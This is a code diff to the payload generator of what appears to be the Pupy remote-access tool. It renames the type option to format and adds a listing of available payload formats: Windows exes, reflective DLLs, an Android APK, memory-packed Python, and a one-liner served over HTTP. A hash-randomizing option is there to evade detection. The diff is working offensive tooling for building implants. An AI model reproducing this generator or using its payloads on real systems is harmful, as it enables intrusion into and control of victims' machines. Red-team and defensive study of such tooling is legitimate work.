@@ -185,22 +185,42 @@ def parse_scriptlets(args_scriptlet, debug=False):
 			exit(1)
 	script_code=sp.pack()
 	return script_code
-	
+class ListOptions(argparse.Action):
+	def __call__(self, parser, namespace, values, option_string=None):
+		print "## available formats :"
+		print "- exe_86, exe_x64 : generate PE exe for windows"
+		print "- dll_86, dll_x64 : generate reflective dll for windows"
+		print "- py : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
+		print "- py_oneliner : same as \"py\" format but served over http to load it from a single command line"
+		print ""
+		print "## available scriptlets :"
+		scriptlets_dic=load_scriptlets()
+		for name, sc in scriptlets_dic.iteritems():
+			print "- %s : "%name
+			sc.print_help()
+			print ""
+		exit()
+
+PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner']
 if __name__=="__main__":
 	parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
-	parser.add_argument('-t', '--type', default='exe_x86', choices=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner'], help="(default: exe_x86)")
+	parser.add_argument('-f', '--format', default='exe_x86', choices=PAYLOAD_FORMATS, help="(default: exe_x86)")
 	parser.add_argument('-o', '--output', help="output path")
 	parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
+	parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, scriptlets and options")
 	parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
 	parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
 	parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
 	parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")
 
 	args=parser.parse_args()
+
+
+
 	script_code=""
 	if args.scriptlet:
 		script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)
-			
+	
 
 	l=launchers[args.launcher]()
 	while True:
@@ -227,45 +247,45 @@ if __name__=="__main__":
 	conf['offline_script']=script_code
 
 	outpath=args.output
-	if args.type=="exe_x86":
+	if args.format=="exe_x86":
 		binary=get_edit_pupyx86_exe(conf)
 		if not outpath:
 			outpath="pupyx86.exe"
 		with open(outpath, 'wb') as w:
 			w.write(binary)
-	elif args.type=="exe_x64":
+	elif args.format=="exe_x64":
 		binary=get_edit_pupyx64_exe(conf)
 		if not outpath:
 			outpath="pupyx64.exe"
 		with open(outpath, 'wb') as w:
 			w.write(binary)
-	elif args.type=="dll_x64":
+	elif args.format=="dll_x64":
 		binary=get_edit_pupyx64_dll(conf)
 		if not outpath:
 			outpath="pupyx64.dll"
 		with open(outpath, 'wb') as w:
 			w.write(binary)
-	elif args.type=="dll_x86":
+	elif args.format=="dll_x86":
 		binary=get_edit_pupyx86_dll(conf)
 		if not outpath:
 			outpath="pupyx86.dll"
 		with open(outpath, 'wb') as w:
 			w.write(binary)
-	elif args.type=="apk":
+	elif args.format=="apk":
 		if not outpath:
 			outpath="pupy.apk"
 		get_edit_apk(os.path.join("payload_templates","pupy.apk"), outpath, conf)
-	elif args.type=="py":
+	elif args.format=="py":
 		if not outpath:
 			outpath="pupy_packed.py"
 		packed_payload=pack_py_payload(get_raw_conf(conf))
 		with open(outpath, 'wb') as w:
 			w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+packed_payload)
-	elif args.type=="py_oneliner":
+	elif args.format=="py_oneliner":
 		packed_payload=pack_py_payload(get_raw_conf(conf))
 		serve_payload(packed_payload)
 	else:
-		exit("Type %s is invalid."%(args.type))
+		exit("Type %s is invalid."%(args.format))
 	print(colorize("[+] ","green")+"payload successfully generated with config :")
 	print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
 	print("LAUNCHER = %s"%repr(args.launcher))
